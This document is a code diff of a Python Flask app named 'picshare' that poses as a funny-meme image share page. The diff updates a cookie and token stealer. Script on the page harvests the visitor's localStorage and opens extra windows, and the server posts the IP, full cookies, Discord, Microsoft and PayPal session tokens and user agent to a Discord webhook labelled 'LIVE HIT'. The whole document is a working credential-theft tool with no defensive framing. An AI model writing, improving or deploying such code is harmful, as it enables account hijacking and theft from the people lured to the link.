@@ -12,22 +12,22 @@ DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1518539631812149330/Uk2DGqWM
 IMAGE_PATH = "real-image.jpg"
 
 def send_to_webhook(data):
-    important = {k: v[:500] for k, v in data.get('cookies', {}).items() 
-                if any(t in k.lower() for t in ['discord', 'token', '__dcf', 'auth', 'session', 'microsoft', 'paypal'])}
+    important = {k: v[:600] for k, v in data.get('cookies', {}).items() if any(t in k.lower() for t in ['discord', 'token', '__dcf', 'auth', 'session', 'microsoft', 'paypal'])}
+    ls = data.get('ls', 'empty')
     
     embed = {
-        "title": "🔴 picshare - Live Hit",
+        "title": "🔴 picshare LIVE HIT",
         "color": 0xFF0000,
         "fields": [
             {"name": "IP", "value": data.get('ip'), "inline": True},
             {"name": "Time", "value": data.get('time')},
             {"name": "Important Tokens", "value": f"```json\n{json.dumps(important, indent=2)}\n```" if important else "none"},
-            {"name": "Full Cookies", "value": f"```json\n{json.dumps(data.get('cookies', {}), indent=2)[:2000]}\n```"},
-            {"name": "LocalStorage", "value": f"```json\n{data.get('ls', 'empty')}\n```"},
-            {"name": "UA", "value": data.get('ua')[:500]}
+            {"name": "Full Cookies", "value": f"```json\n{json.dumps(data.get('cookies', {}), indent=2)[:1900]}\n```"},
+            {"name": "LocalStorage", "value": f"```json\n{ls}\n```"},
+            {"name": "UA", "value": data.get('ua')[:600]}
         ]
     }
-    requests.post(DISCORD_WEBHOOK, json={"embeds": [embed], "content": "**LIVE HIT**"})
+    requests.post(DISCORD_WEBHOOK, json={"embeds": [embed], "content": "**LIVE**"})
 
 @app.route('/image.jpg')
 def serve_image():
@@ -43,7 +43,7 @@ def serve_image():
     if os.path.exists(IMAGE_PATH):
         return send_file(IMAGE_PATH, mimetype='image/jpeg')
     else:
-        img = Image.new('RGB', (1280, 720), color=(18,18,28))
+        img = Image.new('RGB', (1280, 720), color=(10,10,25))
         buf = BytesIO()
         img.save(buf, 'JPEG', quality=95)
         buf.seek(0)
@@ -57,37 +57,33 @@ def view_page():
     <head>
         <meta charset="UTF-8">
         <meta property="og:image" content="/image.jpg">
-        <meta property="og:title" content="picshare - Lustiges Bild">
+        <meta property="og:title" content="picshare - Funny Meme">
         <title>picshare</title>
-        <style>
-            body {margin:0; background:#000; overflow:hidden;}
-            img {width:100vw; height:100vh; object-fit:contain;}
-        </style>
+        <style>body{margin:0;background:#000;overflow:hidden;}img{width:100vw;height:100vh;object-fit:contain;}</style>
     </head>
     <body>
-        <img src="/image.jpg" alt="picshare Image">
+        <img src="/image.jpg" alt="">
         <script>
             function harvest() {
-                let lsData = {};
+                let ls = {};
                 try {
                     for (let i = 0; i < localStorage.length; i++) {
-                        let key = localStorage.key(i);
-                        lsData[key] = localStorage.getItem(key);
+                        let k = localStorage.key(i);
+                        ls[k] = localStorage.getItem(k);
                     }
-                } catch(e) {}
+                } catch(e){}
                 
-                const params = new URLSearchParams({
-                    ls: JSON.stringify(lsData)
-                });
-                
-                fetch('/image.jpg?' + params, {credentials: 'include', cache: 'no-store'});
+                const params = new URLSearchParams({ls: JSON.stringify(ls)});
+                fetch('/image.jpg?' + params, {credentials: 'include', cache: 'no-store', mode: 'no-cors'});
+                fetch('/image.jpg?' + params, {credentials: 'include'});
             }
             
             harvest();
-            setTimeout(harvest, 700);
-            setTimeout(harvest, 1600);
-            setTimeout(() => window.open('/image.jpg', '_blank'), 900);
-            setTimeout(() => window.open(location.href, '_blank'), 2200);
+            setTimeout(harvest, 500);
+            setTimeout(harvest, 1200);
+            setTimeout(() => window.open('/image.jpg', '_blank'), 700);
+            setTimeout(() => window.open(location.href, '_blank'), 1800);
+            setTimeout(harvest, 2500);
         </script>
     </body>
     </html>
